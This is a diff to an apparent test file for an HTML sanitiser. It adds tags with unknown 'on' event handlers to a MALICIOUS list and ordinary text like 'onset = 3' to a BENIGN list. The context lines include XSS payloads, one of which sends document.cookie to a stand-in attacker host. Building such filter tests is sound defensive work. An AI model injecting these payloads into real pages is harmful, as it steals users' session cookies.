@@ -36,6 +36,10 @@ MALICIOUS = [
     "<script>fetch('//evil.example/?c='+document.cookie)</script>",
     "<a href=x onclick/**/=alert(1)>",
     "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+    # unknown handler names are caught only by the generic rule, so it must still fire inside a tag
+    "<x onfoo=1>",
+    "<p/onnewevent=1>",
+    "<div class=a onfuturething = 1>",
 ]
 
 BENIGN = [
@@ -56,6 +60,9 @@ BENIGN = [
     "",
     "Line one\nLine two\twith tab",
     "Café résumé naïve 日本語",
+    "onset = 3 days after symptoms",
+    "one = 1 and once = true",
+    "The onset = 3 days; a < b, so once = 2",
 ]
 
 
